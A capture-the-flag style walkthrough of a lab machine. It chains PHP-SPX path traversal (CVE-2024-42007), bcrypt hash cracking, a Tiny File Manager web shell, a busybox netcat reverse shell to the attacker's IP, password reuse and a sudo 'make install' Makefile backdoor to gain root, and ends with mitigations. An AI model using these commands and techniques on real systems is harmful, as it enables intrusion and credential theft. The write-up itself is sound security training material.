## Introduction

In this walkthrough, I identified that ports 22 and 80 were open on the target machine. Navigating to port 80, I discovered a `phpinfo.php` page, which disclosed the SPX version and its key. Using this information, I exploited the SPX vulnerability to read sensitive data, including credentials for the Tiny File Manager running on the same port. After logging into the file manager, I exploited a file upload vulnerability to gain initial shell access. I then leveraged password reuse to laterally move to a local user account. During privilege escalation, I found that the `make install` command could be run with `sudo`. I modified the target `Makefile` to include a reverse shell, and upon execution, gained root access.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

Version - Apache httpd 2.4.52 ((Ubuntu))

## Exploitation

I googled for default credentials for tiny file manager and tried them `admin`/`admin@123` , `user`/`12345`  but couldn’t get in and  I found also an Authenticated RCE vulnerability for tiny file manager.

Reading `phpinfo.php` page I found SPX, with version `0.4.15` searching for vulnerabilities I found out that it is a novel vulnerability and these 2 pages are very useful explaining and exploiting it.

[Journey to discovery and exploitation of path traversal in PHP-SPX (CVE-2024-42007)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.vicarius.io/vsociety/posts/journey-to-discovery-and-exploitation-of-path-traversal-in-php-spx-cve-2024-42007&ved=2ahUKEwiz982Qt8aNAxV9gf0HHfKDEe0QFnoECAkQAQ&usg=AOvVaw38iNW6CDz6iodA9uHXtO4d)

[Novel Escape from the SPX jungle - Path traversal in PHP-SPX (CVE-2024-42007)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.vicarius.io/vsociety/posts/novel-escape-from-the-spx-jungle-path-traversal-in-php-spx-cve-2024-42007&ved=2ahUKEwiz982Qt8aNAxV9gf0HHfKDEe0QFnoECBsQAQ&usg=AOvVaw2Rd55ia6m6RK2-E-1BOTx6)

We just need to change SPX key to the value given in `phpinfo.php` page.

Using the exploit I was able to leverage LFI and `/etc/passwd` file:

```bash
go run exploit.go -t http://192.168.169.108/ -f /etc/passwd
```

![image.png](image%203.png)

I am gonna try to read credentials of tiny file manager.

But first try to read private key of `profiler` .

```bash
go run exploit.go -t http://192.168.169.108/ -f /home/profiler/.ssh/id_rsa
```

![image.png](image%204.png)

Didn’t worked in this case.

I need to read credentials from `tinefilemanager.py` which is not present and it it was it would be main page, that most probably means we need to read `index.php`.

I also found this but it didn’t return anything

[Azure Marketplace Tiny file manager](https://azuremarketplace.microsoft.com/en-us/marketplace/apps/kcloudhub.tinyfilemanager?tab=overview#:~:text=For%20TinyFileManager%20credentials%20run%20%24%20cat,txt%20on%20your%20VM.&text=Disclaimer%3A%20Tiny%20File%20Manager%20is,and%20lightweight%20file%20management%20needs).

Here we can see that credentails are stored in `tinyfilemanager.php`:

[https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php](https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php)

I tried to read `/var/www/html/index.php` but it didn’t work for both of these exploits:

[https://github.com/BubblyCola/CVE_2024_42007/blob/main/CVE_2024_42007.py](https://github.com/BubblyCola/CVE_2024_42007/blob/main/CVE_2024_42007.py)

[Novel Escape from the SPX jungle - Path traversal in PHP-SPX (CVE-2024-42007)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.vicarius.io/vsociety/posts/novel-escape-from-the-spx-jungle-path-traversal-in-php-spx-cve-2024-42007&ved=2ahUKEwiz982Qt8aNAxV9gf0HHfKDEe0QFnoECBsQAQ&usg=AOvVaw2Rd55ia6m6RK2-E-1BOTx6)

That’s why I am gonna try to include files using BurpSuite manually.

Reading the exploit we understand that we should supply SPX_KEY and SPX_UI_URI parameters.

```python
def exploit(target_url, file_to_read, detection_string):
    traversal = "%2f.." * 18
    encoded_path = urllib.parse.quote(file_to_read)
    vuln_url = f"{target_url}/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI={traversal}{encoded_path}"
```

![image.png](image%206.png)

We can see file is exactly same to tinyfilemanager.php file.

Let’s try to crack hashes. They are `bcrypt, Blowfish` hashes algorithm method that’s why attack will be slow, we are gonna wait for some hit.

```python
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
```

I was able to crack it in 6 minutes on Windows host, it would have taken even more in VM, I think it shouldn’t be like this.

Now we can leverage vulnerability in tinyfilemanager.

I am gonna use the following php reverse shell

[https://github.com/xdayeh/Php-Reverse-Shell](https://github.com/xdayeh/Php-Reverse-Shell)

it still failed, I will use web shell and then try to get a reverse shell now.

It works:

![image.png](image%208.png)

`Busybox` is installed on the target let’s get a shell using it:

![image.png](image%209.png)

```powershell
busybox nc 192.168.45.159 443 -e /bin/bash
```

Now I have a shell:

![image.png](image%2010.png)

Let’s make it more interactive using python.

```powershell
python3 -c 'import pty; pty.spawn("/bin/bash")
```

## Lateral Movement

We see user `profiler` present on the target, now we need to do lateral movement. I checked under `/var/www/html` nothing found, then I used same password for `profiler` user and it worked.

## Privilege Escalation

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

Running `sudo` I see that I can run the following command as root:

```powershell
User profiler may run the following commands on spx:
    (ALL) /usr/bin/make install -C /home/profiler/php-spx
```

It just copies binaries to specific locations.

[What does 'make install' do?](https://superuser.com/questions/360178/what-does-make-install-do)

I should find mostly `cp` command in file, I found this section where it perform install operation:

![image.png](image%2011.png)

Now I am gonna add my reverse shell beside these commands:

![image.png](image%2012.png)

Now as I run the command it hangs in the part where it installs SPX Web UI and gives me a reverse shell.

## Credentials

```python
1) Tiny File Manager
admin : $2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
user : $2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi

2) profiler : lowprofile
```

## Mitigation

- Remove or restrict access to debugging pages like `phpinfo.php` in production environments.
- Do not expose sensitive configuration values (e.g., SPX keys) in web applications.
- Secure web file managers by disabling file uploads and enforcing strong authentication.
- Prevent password reuse across services and enforce strong password policies.
- Restrict `sudo` privileges and carefully audit commands like `make install` that can be misused for privilege escalation.
- Implement file integrity monitoring and logging to detect unauthorized modifications.
